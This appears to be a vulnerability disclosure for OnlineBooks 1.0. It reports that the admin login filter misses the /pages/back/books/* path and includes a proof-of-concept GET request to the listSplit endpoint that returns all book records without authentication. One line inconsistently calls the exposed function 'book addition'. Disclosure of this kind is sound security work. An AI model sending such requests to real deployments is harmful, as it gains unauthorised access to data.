# There is an unauthorized access vulnerability in version 1.0 of OnlineBooks. The AdminLoginFilter does not cover the `/pages/back/books/*` path. An unauthenticated user can access the book list function by exploiting the findAllBySplit method in BooksDAOImpl.java. By accessing the pages/back/books/BooksServlet/listSplit interface, the user can directly obtain information about all books.

Vulnerable Class File: src/cn/ylcto/book/filter/AdminLoginFilter.java



The 9th line of the file does not cover the path of /pages/back/books/*. Unauthenticated users can access the book addition function.

![image-20260802195550036](C:/Users/86133/AppData/Roaming/Typora/typora-user-images/image-20260802195550036.png)

The listSplit method located in src/cn/ylcto/book/servlet/BooksServlet.java allows unauthorized queries of the book list.

![image-20260802200047105](C:/Users/86133/AppData/Roaming/Typora/typora-user-images/image-20260802200047105.png)

POC for Sending a Request Without Any Permissions:

```
GET /pages/back/books/BooksServlet/listSplit?cp=10&ls=1&null=null HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Sec-GPC: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i


```

![image-20260802200135446](C:/Users/86133/AppData/Roaming/Typora/typora-user-images/image-20260802200135446.png)





